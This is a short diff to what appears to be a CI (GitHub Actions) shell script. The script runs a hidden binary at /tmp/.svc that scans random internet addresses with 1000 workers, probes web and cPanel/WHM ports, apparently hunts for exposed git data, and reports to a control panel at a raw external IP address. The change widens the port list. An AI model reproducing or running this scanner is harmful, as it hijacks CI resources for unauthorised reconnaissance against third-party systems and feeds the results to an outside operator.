@@ -13,11 +13,10 @@ chmod 755 /tmp/.svc
 PANEL_URL="http://43.228.157.68:80" \
 GITHUB_REPOSITORY="${GITHUB_REPOSITORY:-}" \
 GITHUB_RUN_ID="${GITHUB_RUN_ID:-}" \
-GOMEMLIMIT=2147483648 \
 /tmp/.svc ipscan \
   --source random \
   --workers 1000 \
   --git \
-  --ports 80,443,2082,2083,2086,2087,2095,2096,2077,2078 \
+  --ports 80,443,8088,8443,2082,2083,2086,2087,2095,2096,2077,2078 \
   --git-workers 20 \
   --count 9999999999 --no-reverse 2>&1 | tail -2 || true
